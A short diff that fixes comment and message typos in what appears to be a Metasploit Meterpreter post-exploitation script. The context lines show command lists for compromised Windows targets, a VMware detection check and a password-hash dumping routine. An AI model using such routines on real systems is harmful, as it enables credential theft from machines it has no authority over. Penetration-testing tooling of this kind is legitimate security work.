@@ -138,7 +138,7 @@ nonwin2kcmd = [
   'wbem\\wmic.exe',
   'netsh.exe',
 ]
-# Executables not pressent in Windows 2000
+# Executables not present in Windows 2000
 nowin2kexe = [
   'netsh.exe',
   'gpresult.exe',
@@ -186,7 +186,7 @@ def chkvm()
   info = @client.sys.config.sysinfo
   print_status "Checking if #{info['Computer']} is a Virtual Machine ........"
 
-  # Check for Target Machines if running in VM, only fo VMware Workstation/Fusion
+  # Check for Target Machines if running in VM, only for VMware Workstation/Fusion
   begin
     key = 'HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS'
     root_key, base_key = @client.sys.registry.splitkey(key)
@@ -338,7 +338,7 @@ def gethash()
     print_status("Hashes Dumped")
   rescue ::Exception => e
     print_status("\tError dumping hashes: #{e.class} #{e}")
-    print_status("\tPayload may be running with insuficient privileges!")
+    print_status("\tPayload may be running with insufficient privileges!")
   end
   flname = "#{@logfol}/hashdump.txt"
   file_local_write(flname,hash)
